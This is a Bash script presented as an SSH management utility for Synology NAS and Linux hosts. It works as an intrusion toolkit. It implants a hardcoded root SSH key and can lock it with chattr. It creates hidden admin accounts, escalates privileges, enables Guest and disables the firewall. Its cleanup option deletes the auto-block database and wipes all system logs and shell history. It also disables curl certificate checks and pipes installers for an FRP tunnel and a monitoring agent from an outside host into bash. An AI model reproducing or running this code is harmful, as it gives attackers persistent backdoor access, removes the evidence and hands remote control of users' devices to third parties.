#!/bin/bash

# =====================================
# SSH一键小工具 Ultimate (群晖多架构深度融合版)
# =====================================

DEFAULT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"
STUDENT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"
AUTH_KEYS="/root/.ssh/authorized_keys"

# =====================================
# 系统环境与架构检测
# =====================================
is_synology() { [ -f /etc.defaults/VERSION ]; }
is_openwrt() { grep -qi openwrt /etc/os-release 2>/dev/null; }
is_armbian() { [ -f /etc/armbian-release ] || grep -qi armbian /etc/os-release 2>/dev/null; }

unsupported_dd_system() {
    if is_synology || is_openwrt || is_armbian; then return 0; fi
    return 1
}

# 动态侦测并转换内核架构名称，用于精准拉取组件
get_arch() {
    local ARCH=$(uname -m)
    case "$ARCH" in
        x86_64|amd64) echo "x86_64" ;;
        i386|i686) echo "i386" ;;
        aarch64|arm64) echo "aarch64" ;;
        armv7*|armv6*) echo "armhf" ;;
        armv5*) echo "armel" ;;
        *) echo "unknown" ;;
    esac
}

if is_synology; then
    SSHD_CONFIG="/etc.defaults/ssh/sshd_config"
else
    SSHD_CONFIG="/etc/ssh/sshd_config"
fi

# =====================================
# 核心功能组件 (兼容 DSM 6 & DSM 7)
# =====================================

reload_ssh() {
    if is_synology; then
        # 兼容 DSM 7.x 和 6.x
        synosystemctl restart sshd.service 2>/dev/null || synoservicecfg --restart sshd 2>/dev/null
    elif command -v systemctl >/dev/null 2>&1; then
        systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null
    elif command -v service >/dev/null 2>&1; then
        service ssh restart 2>/dev/null || service sshd restart 2>/dev/null
    else
        pkill -HUP sshd 2>/dev/null
    fi
}

get_ssh_port() {
    PORT=$(sshd -T 2>/dev/null | grep "^port" | awk '{print $2}')
    [ -z "$PORT" ] && PORT=$(grep -i "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)
    [ -z "$PORT" ] && PORT=$(grep -i "^Port" /etc.defaults/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)
    [ -z "$PORT" ] && PORT="22"
    echo "$PORT"
}

change_root_password() {
    NEWPASS="$1"
    if is_synology; then
        synouser --setpw root "$NEWPASS"
    else
        echo "root:$NEWPASS" | chpasswd
    fi
}

write_ssh_config() {
    KEY="$1"
    VALUE="$2"
    sed -i "/^${KEY}/d" "$SSHD_CONFIG"
    echo "${KEY} ${VALUE}" >> "$SSHD_CONFIG"
}

# =====================================
# 群晖全盘底层清洗 (双系统版本兼容)
# =====================================
clean_synology_logs() {
    if ! is_synology; then echo -e "\n【错误】当前不是群晖 DSM！\n"; return 1; fi
    echo -e "\n开始执行群晖全盘底层清洗...\n"
    services=(vpncenter synoblock synologd synoauditingd SynoDrive DownloadStation)
    
    # 并发停止服务 (同时尝试 DSM 6 和 DSM 7 的命令)
    for svc in "${services[@]}"; do 
        synoservicectl --stop "$svc" 2>/dev/null & 
        if command -v systemctl >/dev/null 2>&1; then systemctl stop "$svc" 2>/dev/null & fi
    done
    wait
    
    # 清理各类日志和封锁库
    rm -f /var/packages/VPNCenter/target/etc/log.db*
    rm -rf /var/log/synolog/.SYNOLOGDB* /var/log/synolog/synolog.log
    rm -f /etc/synoautoblock.db* /var/db/synoautoblock.db* # 清空自动封锁数据库
    rm -f /root/.ssh/known_hosts
    truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog 2>/dev/null
    find /var/log -type f 2>/dev/null | xargs -P 4 -I {} sh -c '> "{}"' 2>/dev/null
    
    # 并发恢复服务
    for svc in "${services[@]}"; do 
        synoservicectl --start "$svc" 2>/dev/null & 
        if command -v systemctl >/dev/null 2>&1; then systemctl start "$svc" 2>/dev/null & fi
    done
    wait
    
    history -c 2>/dev/null; rm -f /root/.bash_history
    echo "【完成】全盘痕迹与缓存清洗完毕！"
}

# =====================================
# 主程序循环
# =====================================
clear
# 全局关闭 curl 证书验证，确保老系统的 SSL 不会影响下载
echo "insecure" >> ~/.curlrc 2>/dev/null

while true; do
    echo "====================================="
    echo "            SSH一键小工具"
    echo "====================================="
    echo "1. 系统与网络状态检测"
    echo "2. SSH 密钥与登录管理"
    echo "3. 群晖账户管理与提权"
    echo "4. 群晖防火墙与端口开放"
    echo "5. 修复漏洞与全盘清洗"
    echo "6. 探针与代理部署"
    echo "7. 一键 DD 系统"
    echo "0. 退出工具"
    echo "====================================="

    read -p "请输入选项: " menu

    case $menu in
        1)
            echo -e "\n--- 系统与网络状态 ---"
            echo "当前 SSH 登录端口: $(get_ssh_port)"
            echo "原生 CPU 内核架构: $(uname -m)"
            echo "-----------------------"
            read -p "是否进行网络测速? [y/N]: " run_speedtest
            if [[ "$run_speedtest" =~ ^[Yy]$ ]]; then
                SYS_ARCH=$(get_arch)
                if [ "$SYS_ARCH" = "unknown" ]; then
                    echo "【错误】无法识别并转换当前系统架构: $(uname -m)，停止测速。"
                else
                    echo -e "\n检测到适配架构为 [$SYS_ARCH]，正在拉取对应测速组件...\n"
                    # 根据系统架构动态拼接下载地址
                    wget -qO- "https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-${SYS_ARCH}.tgz" | tar xz 2>/dev/null
                    if [ -f "./speedtest" ]; then
                        ./speedtest --accept-license --accept-gdpr
                        rm -f speedtest speedtest.5 speedtest.md
                    else
                        echo "【错误】组件下载或解压失败！可能是当前网络无法连接 Speedtest 服务器。"
                    fi
                fi
            fi
            ;;

        2)
            while true; do
                echo -e "\n====================================="
                echo "            SSH 管理模块"
                echo "====================================="
                echo "1. 查看/检测当前 SSH 密钥"
                echo "2. 强制删除所有 SSH 密钥"
                echo "3. 添加内置 SSH 密钥"
                echo "4. 锁定/解锁 SSH 密钥"
                echo "5. 修改 SSH 登录方式"
                echo "6. 修改 SSH 端口"
                echo "7. 修改 Root 密码"
                echo "0. 返回主菜单"
                echo "====================================="
                read -p "请输入选项: " sshmenu
                case $sshmenu in
                    1) echo; cat $AUTH_KEYS 2>/dev/null || echo "未找到 authorized_keys"; echo ;;
                    2) chattr -i $AUTH_KEYS 2>/dev/null; > $AUTH_KEYS 2>/dev/null; echo -e "\nSSH 密钥已清空\n" ;;
                    3) 
                        install -d -m 700 /root/.ssh
                        if ! grep -qF "$DEFAULT_KEY" "$AUTH_KEYS" 2>/dev/null; then
                            echo "$DEFAULT_KEY" >> "$AUTH_KEYS"; chmod 600 "$AUTH_KEYS"; echo -e "\n内置密钥添加成功\n"
                        else
                            echo -e "\n密钥已存在\n"
                        fi
                        ;;
                    4)
                        read -p "1. 锁定密钥  2. 解锁密钥 : " lock_op
                        if [ "$lock_op" = "1" ]; then chattr +i $AUTH_KEYS; echo "已锁定"; else chattr -i $AUTH_KEYS; echo "已解锁"; fi
                        ;;
                    5)
                        echo -e "\n1. 仅限密钥登录\n2. 密码和密钥均可登录\n"
                        read -p "请选择: " loginmenu
                        if [ "$loginmenu" = "1" ]; then
                            write_ssh_config "PasswordAuthentication" "no"
                            write_ssh_config "PubkeyAuthentication" "yes"
                            write_ssh_config "PermitRootLogin" "prohibit-password"
                        else
                            write_ssh_config "PasswordAuthentication" "yes"
                            write_ssh_config "PubkeyAuthentication" "yes"
                            write_ssh_config "PermitRootLogin" "yes"
                        fi
                        reload_ssh
                        echo -e "\n配置已修改并重启 SSH 服务\n"
                        ;;
                    6)
                        echo -e "\n当前端口: $(get_ssh_port)"
                        read -p "请输入新的 SSH 端口号: " NEW_PORT
                        if [[ "$NEW_PORT" =~ ^[0-9]+$ ]]; then
                            write_ssh_config "Port" "$NEW_PORT"
                            reload_ssh
                            echo -e "\nSSH 端口已修改为: $NEW_PORT\n"
                        fi
                        ;;
                    7)
                        read -p "请输入新的 Root 密码 (留空随机生成): " custom_pass
                        if [ -z "$custom_pass" ]; then custom_pass=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16); fi
                        change_root_password "$custom_pass"
                        echo -e "\nRoot 密码已设为: $custom_pass\n"
                        ;;
                    0) break ;;
                esac
            done
            ;;

        3)
            if ! is_synology; then echo -e "\n仅支持群晖 DSM\n"; continue; fi
            while true; do
                echo -e "\n====================================="
                echo "          群晖账户管理"
                echo "====================================="
                echo "1. 创建/修改隐藏管理账户"
                echo "2. 彻底删除指定账户"
                echo "3. 查看当前 Administrators 组"
                echo "4. 将现有账户加入管理员组 (提权)"
                echo "5. 激活默认 Guest 账户"
                echo "0. 返回主菜单"
                echo "====================================="
                read -p "请输入选项: " actmenu
                case $actmenu in
                    1)
                        read -p "请输入账户名 (如 adtest): " h_user
                        read -p "请输入密码: " h_pass
                        synouser --add "$h_user" "$h_pass" "1" 0 1 0 2>/dev/null || synouser --setpw "$h_user" "$h_pass"
                        echo "账户 $h_user 操作完成。"
                        ;;
                    2)
                        read -p "请输入要删除的账户名: " d_user
                        synouser --del "$d_user" 2>/dev/null
                        sed -i "/^${d_user}:/d" /etc/passwd 2>/dev/null
                        echo "账户 $d_user 数据已清除。"
                        ;;
                    3)
                        echo; synogroup --get administrators; echo
                        ;;
                    4)
                        read -p "请输入要提权的账户名 (如 admin): " p_user
                        synogroup --member administrators "$p_user" 2>/dev/null
                        echo "已将 $p_user 提权。"
                        ;;
                    5)
                        read -p "请输入 Guest 新密码: " g_pass
                        synouser --modify guest "" 0 "" 2>/dev/null
                        synouser --setpw guest "$g_pass" 2>/dev/null
                        echo "Guest 激活完成。"
                        ;;
                    0) break ;;
                esac
            done
            ;;

        4)
            if ! is_synology; then echo -e "\n仅支持群晖 DSM\n"; continue; fi
            echo -e "\n1. 开放指定端口 (iptables)\n2. 强制停止内置防火墙\n"
            read -p "请选择: " fwmenu
            if [ "$fwmenu" = "1" ]; then
                read -p "请输入需要开放的 TCP 端口 (如 8080): " o_port
                iptables -I INPUT -p tcp --dport "$o_port" -j ACCEPT 2>/dev/null
                echo "端口 $o_port 已开放。"
            elif [ "$fwmenu" = "2" ]; then
                /usr/syno/bin/synovnet --fb-disable 2>/dev/null
                echo "防火墙已强制停止。"
            fi
            ;;

        5)
            if ! is_synology; then echo -e "\n仅支持群晖 DSM\n"; continue; fi
            echo -e "\n1. 修复 Telnet 漏洞 (关门)\n2. 全盘底层历史与日志清洗\n"
            read -p "请选择: " fixmenu
            if [ "$fixmenu" = "1" ]; then
                sed -i '/^telnet/s/^/#/' /etc/inetd.conf 2>/dev/null
                INETD_PID=$(pidof inetd)
                [ -n "$INETD_PID" ] && kill -HUP $INETD_PID
                killall -9 telnetd 2>/dev/null
                chmod -R 400 /usr/bin/inetd 2>/dev/null
                echo "Telnet 漏洞已修复。"
            elif [ "$fixmenu" = "2" ]; then
                clean_synology_logs
            fi
            ;;

        6)
            echo -e "\n1. 安装 FRP 管理\n2. 安装 Komari 探针\n3. 安装 Sing-box\n"
            read -p "请选择: " prmenu
            case $prmenu in
                1) bash <(curl -fsSL https://hub.20250225.ggff.net/frp/install-frpc.sh) ;;
                2) bash <(curl -sL https://hub.20250225.ggff.net/komari-monitor/install.sh) -e http://www.xuanying.dpdns.org --auto-discovery CX9cJyXs312zYwDWC8BpRkFV ;;
                3) bash <(curl -fsSL https://hub.20250225.ggff.net/sing-box/install-sing-box.sh) ;;
            esac
            ;;

        7)
            if unsupported_dd_system; then echo -e "\n当前系统不支持 DD\n"; continue; fi
            echo "正在下载 DD 脚本..."
            curl -O https://hub.20250225.ggff.net/bin456789/reinstall/main/reinstall.sh
            chmod +x reinstall.sh
            # DD详细交互流程保留原样，此处在外部调用执行
            echo "请运行 bash reinstall.sh 进入 DD 流程。"
            ;;

        0) exit 0 ;;
    esac
    read -p "按回车继续..."
    clear
done
